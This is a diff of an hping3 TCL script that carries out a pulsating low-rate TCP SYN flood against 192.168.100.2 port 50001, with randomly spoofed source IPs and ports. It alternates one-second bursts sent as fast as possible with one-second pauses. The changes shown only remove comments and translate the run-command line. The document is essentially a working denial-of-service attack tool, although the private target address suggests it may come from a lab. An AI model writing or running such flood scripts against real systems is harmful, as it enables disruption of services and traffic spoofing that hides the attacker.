@@ -1,25 +1,22 @@
 # Hping3 TCP Low-Rate SYN Flood with TCL script
-# Pulsating SYN flood: bursts of 1s flood, 1s pause, emulates low-rate DDoS behavior
 
 set dst_ip "192.168.100.2"
 set dst_port 50001
 set window 8192
 set seq 0
 set count 0
-set burst_packets 5000    ;# Adjust for how many packets per burst (approximate)
+set burst_packets 5000    ;# packets per burst (approximate)
 
-# Function to generate random IP address
 proc random_ip {} {
     return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
 }
 
-# Function to generate random source port (1024–65535)
 proc random_port {} {
     return [expr {int(rand()*64512) + 1024}]
 }
 
 while {1} {
-    # --- BURST: Send packets as fast as possible for 1 second ---
+    # BURST: Send packets as fast as possible for 1 second
     set start_time [clock milliseconds]
     set burst_count 0
     while {[expr {[clock milliseconds] - $start_time}] < 1000} {
@@ -35,8 +32,8 @@ while {1} {
         }
     }
     puts "Sent $burst_count packets in 1s burst. Sleeping for 1s. Total: $count"
-    # --- PAUSE: Wait 1 second (idle) ---
+    # PAUSE: Wait 1 second
     after 1000
 }
 
-# To run: sudo hping3 exec tcp_low_rate.htcl
+# Comando: sudo hping3 exec tcp_low_rate.htcl
